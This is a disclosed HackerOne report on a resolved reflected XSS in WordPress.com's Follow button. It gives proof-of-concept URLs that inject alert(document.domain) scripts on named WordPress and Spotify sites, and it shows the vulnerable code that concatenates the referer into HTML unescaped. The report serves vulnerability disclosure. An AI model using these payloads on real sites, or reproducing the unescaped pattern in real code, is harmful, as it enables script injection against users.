---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '172574'
original_report_id: '172574'
title: Follow Button XSS
weakness: Cross-site Scripting (XSS) - Generic
team_handle: automattic
created_at: '2016-09-28T07:06:46.944Z'
disclosed_at: '2016-10-28T12:44:46.991Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Follow Button XSS

## Metadata

- HackerOne Report ID: 172574
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: automattic
- Disclosed At: 2016-10-28T12:44:46.991Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**PoC**
1) Open link
2) Click "Follow" in the bottom right-hand corner

XSS Should work on any wordpress site with this Follow button. 
fbd.isLoggedIn must be equal to false.

```
https://apps.wordpress.com/support/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://labs.spotify.com/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://news.spotify.com/tr/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
```

**Vulnerable Code**
apps.wordpress.com
```html
<script type='text/javascript'>
/* <![CDATA[ */
var actionbardata = {
...
"subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"9dca8606d3\" \/><input type=\"hidden\" name=\"_wp_http_referer\" 
value=\"\/support\/\"><script>alert(document.domain)<\/script>\" \/>",
"referer":"https:\/\/apps.wordpress.com\/support\/\"><script>alert(document.domain)<\/script>",
"canFollow":"1"
...
</script>
```

s2.wp.com/_static/
```js
	// Follow Site
	$actionbar.on(  'click', '.actnbr-actn-follow', function(e) {
		e.preventDefault();

		if ( fbd.isLoggedIn ) {
			showActionBarStatusMessage( '<div class="actnbr-reader">' + fbd.i18n.followedText + '</div>' );
			bumpStat( 'followed' );
			request( 'ab_subscribe_to_blog' );
		} else {
			showActionBarFollowForm();
		}
	} )
	...
		function showActionBarFollowForm() {
		var btn = $( '#actionbar .actnbr-btn' );
		btn.toggleClass( 'actnbr-hidden' );

		$( '#actionbar .actnbr-follow-bubble' ).html( ' \
			...
			<input type="hidden" name="blog_id" value="' + fbd.siteID + '"/> \
			<input type="hidden" name="source" value="' + fbd.referer + '"/> \
			<input type="hidden" name="sub-type" value="actionbar-follow"/> \
			' + fbd.subscribeNonce + ' \
			...
		');
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
